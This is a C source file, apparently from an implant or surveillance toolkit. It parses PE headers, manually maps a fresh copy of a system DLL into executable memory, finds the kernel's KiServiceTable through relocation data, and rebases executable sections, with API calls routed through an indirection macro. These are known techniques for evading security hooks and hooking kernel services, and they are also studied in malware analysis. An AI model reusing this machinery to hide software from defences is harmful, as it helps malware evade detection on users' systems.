
#include "HM_Reloc.h"
#include "HM_SafeProcedures.h"
#include "common.h"

BOOL readPEInfo(char *modulePos, MZHeader *outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, SectionHeader **outSecHdr)
{
	MZHeader *mzH;
	mzH = (MZHeader *)modulePos;

	if(mzH->signature != 0x5a4d)
		return FALSE;

	PE_Header *peH;
	peH = (PE_Header *)(modulePos + mzH->offsetToPE);

	if(peH->sizeOfOptionHeader != sizeof(PE_ExtHeader))
		return FALSE;

	PE_ExtHeader *peXH;
	peXH = (PE_ExtHeader *)((char *)peH + sizeof(PE_Header));

	SectionHeader *secHdr = (SectionHeader *)((char *)peXH + sizeof(PE_ExtHeader));

	*outMZ = *mzH;
	*outPE = *peH;
	*outpeXH = *peXH;
	*outSecHdr = secHdr;

	return TRUE;
}


//*******************************************************************************************************
// Returns the total size required to load a PE image into memory
//
//*******************************************************************************************************

int calcTotalImageSize(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
					   SectionHeader *inSecHdr)
{
	int result = 0;
	int alignment = inpeXH->sectionAlignment;

	if(inpeXH->sizeOfHeaders % alignment == 0)
		result += inpeXH->sizeOfHeaders;
	else
	{
		int val = inpeXH->sizeOfHeaders / alignment;
		val++;
		result += (val * alignment);
	}
	for(int i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].virtualSize)
		{
			if(inSecHdr[i].virtualSize % alignment == 0)
				result += inSecHdr[i].virtualSize;
			else
			{
				int val = inSecHdr[i].virtualSize / alignment;
				val++;
				result += (val * alignment);
			}
		}
	}

	return result;
}


//*******************************************************************************************************
// Returns the aligned size of a section
//
//*******************************************************************************************************

ULONG getAlignedSize(unsigned long curSize, unsigned long alignment)
{	
	if(curSize % alignment == 0)
		return curSize;
	else
	{
		int val = curSize / alignment;
		val++;
		return (val * alignment);
	}
}

//*******************************************************************************************************
// Copy a PE image from exePtr to ptrLoc with proper memory alignment of all sections
//
//*******************************************************************************************************

BOOL loadPE(char *exePtr, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
			SectionHeader *inSecHdr, LPVOID ptrLoc)
{
	char *outPtr = (char *)ptrLoc;

	memcpy(outPtr, exePtr, inpeXH->sizeOfHeaders);
	outPtr += getAlignedSize(inpeXH->sizeOfHeaders, inpeXH->sectionAlignment);

	for(int i = 0; i < inPE->numSections; i++)
	{
		if(inSecHdr[i].sizeOfRawData > 0)
		{
			unsigned long toRead = inSecHdr[i].sizeOfRawData;
			if(toRead > inSecHdr[i].virtualSize)
				toRead = inSecHdr[i].virtualSize;

			memcpy(outPtr, exePtr + inSecHdr[i].pointerToRawData, toRead);

			outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
		}
	}

	return true;
}


//*******************************************************************************************************
// Loads the DLL into memory and align it
//
//*******************************************************************************************************

LPVOID loadDLL(char *dllName)
{
	char moduleFilename[MAX_PATH + 1];
	LPVOID ptrLoc = NULL;
	MZHeader mzH2;
	PE_Header peH2;
	PE_ExtHeader peXH2;
	SectionHeader *secHdr2;

	FNC(GetSystemDirectoryA)(moduleFilename, MAX_PATH);
	if((myStrlenA(moduleFilename) + myStrlenA(dllName)) >= MAX_PATH)
		return NULL;

	strncat_s(moduleFilename, MAX_PATH, dllName, MAX_PATH);

	// load this EXE into memory because we need its original Import Hint Table

	HANDLE fp;
	fp = FNC(CreateFileA)(moduleFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if(fp != INVALID_HANDLE_VALUE)
	{
		BY_HANDLE_FILE_INFORMATION fileInfo;
		FNC(GetFileInformationByHandle)(fp, &fileInfo);

		DWORD fileSize = fileInfo.nFileSizeLow;
		if(fileSize)
		{
			LPVOID exePtr = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if(exePtr)
			{
				DWORD read;

				if(FNC(ReadFile)(fp, exePtr, fileSize, &read, NULL) && read == fileSize)
				{					
					if(readPEInfo((char *)exePtr, &mzH2, &peH2, &peXH2, &secHdr2))
					{
						int imageSize = calcTotalImageSize(&mzH2, &peH2, &peXH2, secHdr2);						

						ptrLoc = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						//ptrLoc = HeapAlloc(GetProcessHeap(), 0, imageSize);
						if(ptrLoc)
						{							
							loadPE((char *)exePtr, &mzH2, &peH2, &peXH2, secHdr2, ptrLoc);
						}
					}

				}
				//HeapFree(GetProcessHeap(), 0, exePtr);
				FNC(VirtualFreeEx)(FNC(GetCurrentProcess)(), exePtr, 0, MEM_RELEASE);
			}
		}
		CloseHandle(fp);
	}

	return ptrLoc;
}

DWORD myStrlenA(char *ptr)
{
	DWORD len = 0;
	while(*ptr)
	{
		len++;
		ptr++;
	}

	return len;
}

DWORD GetHeaders(PCHAR ibase,
                 PIMAGE_FILE_HEADER *pFH,
                 PIMAGE_OPTIONAL_HEADER *pOH,
                 PIMAGE_SECTION_HEADER *pSH)

{
    PIMAGE_DOS_HEADER mzhead = (PIMAGE_DOS_HEADER) ibase;
    
    if( (mzhead->e_magic != IMAGE_DOS_SIGNATURE) ||        
        (ibaseDD[mzhead->e_lfanew] != IMAGE_NT_SIGNATURE)  )
        return false;
    
    *pFH = (PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
    if( ((PIMAGE_NT_HEADERS)*pFH)->Signature != IMAGE_NT_SIGNATURE )
        return false;

    *pFH = (PIMAGE_FILE_HEADER)((PBYTE)*pFH + sizeof(IMAGE_NT_SIGNATURE));
    
    *pOH = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*pFH + sizeof(IMAGE_FILE_HEADER));

    if ((*pOH)->Magic!=IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        return false;
    
    *pSH = (PIMAGE_SECTION_HEADER)((PBYTE)*pOH + sizeof(IMAGE_OPTIONAL_HEADER));

    return true;
}


DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)
{
    PIMAGE_FILE_HEADER		pFH;
    PIMAGE_OPTIONAL_HEADER	pOH;
    PIMAGE_SECTION_HEADER   pSH;
    PIMAGE_BASE_RELOCATION  pBR;
    PIMAGE_FIXUP_ENTRY		pFE;    
    
    DWORD	dwFixups=0,i;
	DWORD	dwPointerRva;
	DWORD	dwPointsToRva;
	DWORD	dwKiServiceTable;
    BOOL    bFirstChunk;

    if( !GetHeaders((PCHAR)hModule,&pFH,&pOH,&pSH) )
		return NULL;

    if( (pOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&
		!((pFH->Characteristics)&IMAGE_FILE_RELOCS_STRIPPED) ) {
        
        pBR = (PIMAGE_BASE_RELOCATION) RVATOVA(pOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,hModule);

        bFirstChunk = true;

        while( bFirstChunk || pBR->VirtualAddress ) {
            
			bFirstChunk = false;
            pFE = (PIMAGE_FIXUP_ENTRY)((DWORD)pBR + sizeof(IMAGE_BASE_RELOCATION));

            for( i=0; i < (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))>>1; i++,pFE++ ) {
                if( pFE->type == IMAGE_REL_BASED_HIGHLOW ) {
                    dwFixups++;
                    dwPointerRva  = pBR->VirtualAddress + pFE->offset;
                    dwPointsToRva = *(PDWORD)((DWORD)hModule + dwPointerRva) - (DWORD)pOH->ImageBase;

                    if( dwPointsToRva == dwKSDT ) {
                        if( *(PWORD)((DWORD)hModule + dwPointerRva - 2) == 0x05c7 ) {
                            dwKiServiceTable = *(PDWORD)((DWORD)hModule + dwPointerRva + 4) - pOH->ImageBase;
                            return dwKiServiceTable;
                        }
                    }          
                } 
            }
	        *(PDWORD)&pBR += pBR->SizeOfBlock;
        }
    }    
    
    return NULL;
}

BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
{
	MZHeader mzH2;
	PE_Header peH2;
	PE_ExtHeader peXH2;
	SectionHeader *secHdr2;

	if (!exeAddr || !newAddr)
		return FALSE;

	if(!readPEInfo((char *)exeAddr, &mzH2, &peH2, &peXH2, &secHdr2))
		return FALSE;

	if(peXH2.relocationTableAddress && peXH2.relocationTableSize) {
		FixupBlock *fixBlk = (FixupBlock *)((char *)exeAddr + peXH2.relocationTableAddress);		

		while(fixBlk->blockSize) {
			// Que - Questa funzione imposta _flags_ alle caratteristiche della sezione, in modo da
			// rilocare soltanto le entry di quelle sezioni che sono eseguibili. La mettiamo qui
			// cosi' evitiamo overhead, tanto ogni blocco si trova sicuramente all'interno della
			// stessa sezione.
			DWORD flags = 0;

			for(int j = 0; j < peH2.numSections; j++){
				if(peXH2.imageBase + fixBlk->pageRVA >= peXH2.imageBase + secHdr2[j].virtualAddress &&
					peXH2.imageBase + fixBlk->pageRVA < peXH2.imageBase + secHdr2[j].virtualAddress +
					secHdr2[j].virtualSize){

						flags = secHdr2[j].characteristics;
						break;
				}
				flags = 0;
			}

			int numEntries = (fixBlk->blockSize - sizeof(FixupBlock)) >> 1;
			unsigned short *offsetPtr = (unsigned short *)(fixBlk + 1);
			for(int i = 0; i < numEntries; i++)	{				
				int relocType = (*offsetPtr & 0xF000) >> 12;
				if(relocType == 3) {
					DWORD *codeLoc = (DWORD *)((char *)exeAddr + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));					
					DWORD delta = (DWORD)newAddr - (DWORD)peXH2.imageBase;					
					DWORD value = (*codeLoc) + delta;
					DWORD dummy;

					if(flags && (flags & IMAGE_SCN_MEM_EXECUTE))
						HM_SafeWriteProcessMemory(FNC(GetCurrentProcess)(), codeLoc, &value, sizeof(DWORD), &dummy);
				}
				offsetPtr++;
			}
			fixBlk = (FixupBlock *)offsetPtr;
		}
		return TRUE;
	}
	return FALSE;
}
